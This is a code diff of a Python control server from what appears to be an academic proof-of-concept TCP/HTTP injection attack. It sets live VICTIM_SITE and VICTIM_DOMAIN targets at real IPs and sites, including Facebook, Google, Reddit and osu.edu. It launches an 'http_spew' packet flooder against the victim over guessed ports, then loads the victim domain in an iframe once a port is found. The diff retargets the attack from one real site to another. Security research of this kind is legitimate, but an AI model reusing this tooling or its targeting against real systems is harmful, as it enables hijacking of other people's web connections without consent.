@@ -42,7 +42,7 @@ HIGH_PORT = 61000
 
 PORT_BUCKET_SIZE = (HIGH_PORT - LOW_PORT) / NUM_BUCKETS
 TEST_VICTIM_IP = '12.168.1.113'
-VICTIM_SITE = '69.171.242.11' # facebook (can only use on campus)
+#VICTIM_SITE = '69.171.242.11' # facebook (can only use on campus)
 #VICTIM_SITE = '74.125.225.102' # google (can only use on campus)
 #VICTIM_SITE = '66.220.149.11'  # can't use non-umich because merit egress filters
 
@@ -57,6 +57,17 @@ VICTIM_SITE = '69.171.242.11' # facebook (can only use on campus)
 
 #VICTIM_SITE = '23.21.237.114'   # factorable.net
 #VICTIM_SITE_IMG = 'http://%d-x-%d.f.hobocomp.com/'
+#VICTIM_DOMAIN = 'factorable.net'
+
+#VICTIM_SITE = '68.40.51.184'
+#VICTIM_DOMAIN = 'hobocomp.com'
+
+VICTIM_SITE = '192.122.184.99'
+VICTIM_DOMAIN = 'www.reddit.com'
+
+VICTIM_SITE = '140.254.112.210'
+#VICTIM_DOMAIN = 'osu.edu'
+VICTIM_DOMAIN = 'osu.edu/2008/images/home/sprite2.png'
 
 NEW_CONNECTION_PERIOD = 0.4
 CONNECTION_TIMEOUT = 30.0
@@ -110,7 +121,7 @@ class ControlWebSocket(Protocol):
                 return
         except OSError, e:
             print 'Error: %s' % e.strerror
-        os.execvp('./http_spew', ['./http_spew', '-p', '%d' % (self.seq_spew_port), \
+        os.execvp('./http_spew', ['./http_spew', '-p', '%d-%d' % (self.seq_spew_port, self.seq_spew_port + 1), \
                     '-r',  '0', '-d', str(int(self.SPEW_DELAY_US) / 2), self.addr.host, \
                     '%s:80' % (VICTIM_SITE)])
 
@@ -167,7 +178,7 @@ class ControlWebSocket(Protocol):
             print 'Success!!! we did it! port: %d' % port
             self.transport.write("show <b>Used port %d</b>" % port) 
             
-            self.transport.write("init_iframe http://%s/" % (VICTIM_SITE))
+            self.transport.write("init_iframe http://%s" % (VICTIM_DOMAIN))
                         
             reactor.callLater(13.37, self.make_iframe)
             self.seq_spew_port = port + 1
